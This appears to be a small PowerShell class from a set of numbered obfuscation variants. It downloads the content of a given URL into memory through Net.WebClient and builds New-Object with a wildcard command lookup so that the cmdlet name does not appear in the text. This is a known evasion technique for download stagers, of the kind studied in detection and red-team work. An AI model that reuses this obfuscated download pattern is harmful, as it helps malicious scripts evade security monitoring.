Class ObfDownloadFileContent4 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Cmdlet\2
        Write-Host $url
        Write-Host (&(COMMAND Ne*ct)Net.WebClient).DownloadString($url)
    }

}